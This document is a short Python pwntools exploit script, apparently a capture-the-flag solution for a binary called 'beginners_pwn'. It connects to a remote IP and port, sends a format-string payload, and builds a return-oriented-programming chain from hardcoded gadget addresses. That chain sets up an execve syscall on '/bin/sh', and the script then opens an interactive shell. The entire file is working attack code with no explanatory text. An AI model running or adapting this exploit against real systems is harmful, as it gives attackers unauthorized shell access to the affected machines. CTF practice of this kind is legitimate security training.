from pwn import *

#context.log_level = 'debug'

r = remote("35.221.81.216", 30002)
#r = process(['stdbuf', '-i0', '-o0', '-e0', './beginners_pwn'])

r.sendline(b"%7$d" + b" %s " + p64(0x404018))

pop_rdi = p64(0x00000000004012c3)# pop rdi;
pop_rsi = p64(0x00000000004012c1)# pop rsi; pop r15; ret; )
readn   = p64(0x401146)
bss_addr=p64(0x404050)
empty_addr = p64(0x404050+0x200)
rbp_stuff = p64(0x404050+0x100)
syscall = p64(0x000000000040118f)

rop = b""
rop += rbp_stuff * 3
rop += pop_rdi
rop += bss_addr
rop += pop_rsi
rop += p64(59)
rop += p64(0xdeadbeef)
rop += readn
#rop += p64(0xdeadbeef)
#rop += "\x3b\nB\n"

first_gadget_adr    = 0x4012ba
second_gadget_adr   = 0x4012a0
init_pointer        = 0x403e48

#
rop += p64(first_gadget_adr)
rop += p64(0x00)            # pop rbx
rop += p64(0x01)            # pop rbp
rop += p64(init_pointer)    # pop r12
rop += p64(0x00)            # pop r13
rop += empty_addr            # pop r14
rop += p64(init_pointer) # pop r15
rop += p64(second_gadget_adr)
rop += p64(0x00)            # add rsp,0x8 padding
rop += p64(0x00)            # rbx
rop += p64(0x00)            # rbp
rop += p64(0x00)            # r12
rop += p64(0x00)            # r13
rop += p64(0x00)            # r14
rop += p64(0x00)            # r15
#rop += p64(0xdeadbeef)
rop += pop_rdi
rop += bss_addr
rop += pop_rsi
rop += empty_addr
rop += p64(0)
rop += syscall
rop += p64(0xdeadbeef)



pause()
r.send(bytes(str(0x0000000000401256), 'utf8')+ b" " + rop + b' A')
pause()
r.sendline("/bin/sh\x00"+ ("\x3b" * (0x3b-8)))
#r.sendline("/bin/sh\x00"+ ("\x3b" * (0x3b-8)))
#r.sendline("/bin/sh\x00"+ ("\x3b" * (0x3b-8)))

r.interactive()


